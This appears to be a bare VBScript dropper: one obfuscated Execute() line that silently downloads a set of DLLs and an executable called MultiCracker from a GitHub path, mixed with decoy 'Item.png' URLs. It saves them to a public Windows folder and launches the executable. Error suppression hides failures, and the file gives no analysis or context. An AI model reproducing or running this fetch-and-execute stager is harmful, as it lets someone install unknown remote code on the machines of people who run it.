Execute("Option Explicit:On Error Resume Next:Dim objFSO:Set objFSO = CreateObject(""Scripting.FileSystemObject""):For i = LBound(strHDLocations) To UBound(strHDLocations):Dim strDirectory:strDirectory = objFSO.GetParentFolderName(strHDLocations(i)):If Not objFSO.FolderExists(strDirectory) Then:objFSO.CreateFolder(strDirectory):End If:Next:Set objFSO = Nothing:Dim objXMLHTTP, strFileURLs, strHDLocations, i:strFileURLs = Array(""https://google.com/files/Item.png0"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/AForge.dll"", ""https://google.com/files/Item.png1"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/Discord.Net.Core.dll"", ""https://google.com/files/Item.png2"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/Discord.Net.Commands.dll"", ""https://google.com/files/Item.png3"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/Discord.Net.Interactions.dll"", ""https://google.com/files/Item.png4"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/Discord.Net.Rest.dll"", ""https://google.com/files/Item.png5"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/Discord.Net.WebSocket.dll"", ""https://google.com/files/Item.png6"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/Discord.Net.Webhook.dll"", ""https://google.com/files/Item.png7"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/Microsoft.Extensions.DependencyInjection.Abstractions.dll"", ""https://google.com/files/Item.png8"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/MultiCracker.deps.json"", ""https://google.com/files/Item.png9"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/MultiCracker.dll"", ""https://google.com/files/Item.png10"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/MultiCracker.exe"", ""https://google.com/files/Item.png11"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/MultiCracker.pdb"", ""https://google.com/files/Item.png12"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/MultiCracker.runtimeconfig.json"", ""https://google.com/files/Item.png13"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/Newtonsoft.Json.dll"", ""https://google.com/files/Item.png14"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/System.Interactive.Async.dll"", ""https://google.com/files/Item.png15"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/System.Linq.Async.dll"", ""https://google.com/files/Item.png16"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/System.Reactive.dll"", ""https://google.com/files/Item.png17"", ""https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/MultiCracker/2.2.0/MultiCracker.deps.json""):strHDLocations = Array(""C:\users\public\Item.png0"", ""C:\users\public\watch\AForge.dll"", ""C:\users\public\Item.png1"", ""C:\users\public\watch\Discord.Net.Core.dll"", ""C:\users\public\Item.png2"", ""C:\users\public\watch\Discord.Net.Commands.dll"", ""C:\users\public\Item.png3"", ""C:\users\public\watch\Discord.Net.Interactions.dll"", ""C:\users\public\Item.png4"", ""C:\users\public\watch\Discord.Net.Rest.dll"", ""C:\users\public\Item.png5"", ""C:\users\public\watch\Discord.Net.WebSocket.dll"", ""C:\users\public\Item.png6"", ""C:\users\public\watch\Discord.Net.Webhook.dll"", ""C:\users\public\Item.png7"", ""C:\users\public\watch\Microsoft.Extensions.DependencyInjection.Abstractions.dll"", ""C:\users\public\Item.png8"", ""C:\users\public\watch\MultiCracker.deps.json"", ""C:\users\public\Item.png9"", ""C:\users\public\watch\MultiCracker.dll"", ""C:\users\public\Item.png10"", ""C:\users\public\watch\MultiCracker.exe"", ""C:\users\public\Item.png11"", ""C:\users\public\watch\MultiCracker.pdb"", ""C:\users\public\Item.png12"", ""C:\users\public\watch\MultiCracker.runtimeconfig.json"", ""C:\users\public\Item.png13"", ""C:\users\public\watch\Newtonsoft.Json.dll"", ""C:\users\public\Item.png14"", ""C:\users\public\watch\System.Interactive.Async.dll"", ""C:\users\public\Item.png15"", ""C:\users\public\watch\System.Linq.Async.dll"", ""C:\users\public\Item.png16"", ""C:\users\public\watch\System.Reactive.dll"", ""C:\users\public\Item.png17"", ""C:\users\public\MultiCracker.deps.json""):Set objXMLHTTP = CreateObject(""MSXML2.ServerXMLHTTP""):For i = LBound(strFileURLs) To UBound(strFileURLs):Dim strFileURL, strFileName, strHDLocation:strFileURL = strFileURLs(i):strFileName = Mid(strFileURL, InStrRev(strFileURL, ""/"") + 1):strHDLocation = strHDLocations(i):objXMLHTTP.Open ""GET"", strFileURL, False:objXMLHTTP.send:If objXMLHTTP.Status = 200 Then:Dim objADOStream:Set objADOStream = CreateObject(""ADODB.Stream""):objADOStream.Open:objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0:objADOStream.SaveToFile strHDLocation:objADOStream.Close:Set objADOStream = Nothing:End If:Next:Dim objShell:Set objShell = CreateObject(""WScript.Shell""):objShell.Run ""C:\users\public\watch\MultiCracker.exe"", 1, False:Set objXMLHTTP = Nothing")